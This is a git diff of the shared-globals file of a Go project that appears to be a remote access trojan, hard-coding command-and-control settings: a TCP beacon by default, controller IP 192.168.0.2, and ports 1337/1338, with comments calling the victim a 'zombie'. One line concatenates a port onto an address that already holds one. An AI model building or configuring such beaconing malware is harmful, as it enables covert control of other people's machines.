@@ -3,7 +3,7 @@ This file contains the global variables we need to allow our functions to
 share various things between them. Try to avoid having too many of these.
 And limit thier scope/context within which you use them
 /*/
-package rat_shared_code
+package Rat_shared_code
 
 // import the libraries we need
 import (
@@ -29,25 +29,36 @@ import (
 
 // This gets set by the script that generates the binary
 // for the target.
-
 var BEACON_ON_START bool
 
+//if BEACON_ON_START == true {
 // can be one of four options, http, tcp, udp, dns
-var BACON_TYPE string
+// Default is TCP callback
+var BACON_TYPE string = "tcp"
 
+//}
 // declaring global variables to share our
 // network information between scopes
 // these are for TCP/UDP specifically
-// instanced without a value assigned
-var Local_tcpaddr_LAN net.TCPAddr
+
+// we set these variables manually for now
+// I will eventually make a python script to set these automatically
+// COMMAND AND CONTROL ADDRESSES
+// WE ARE LOCAL, ZOMBIE IS REMOTE!
+var commandIP net.IP = net.ParseIP("192.168.0.2")
+var TCPPORT int = 1337
+var UDPPORT int = 1338
+var Local_tcpaddr_LAN net.TCPAddr = net.TCPAddr{IP: commandIP, Port: TCPPORT}
+var Local_udpaddr_LAN net.UDPAddr = net.UDPAddr{IP: commandIP, Port: UDPPORT}
+
 var Local_tcpaddr_WAN net.TCPAddr
-var Local_udpaddr_LAN net.UDPAddr
 var Local_udpaddr_WAN net.UDPAddr
 
-// instanced with a value assigned
+// these are set to a IP on the LAN
+// you would set these
 var Remote_tcpport string = ":1337"
 var Remote_tcpaddr string = "192.168.0.2" + Remote_tcpport
-var Remote_udpport string = ":1337"
+var Remote_udpport string = ":1338"
 var Remote_udpaddr string = Remote_tcpaddr + Remote_udpport
 var Remote_http_addr string
 var Remote_ftp_addr string
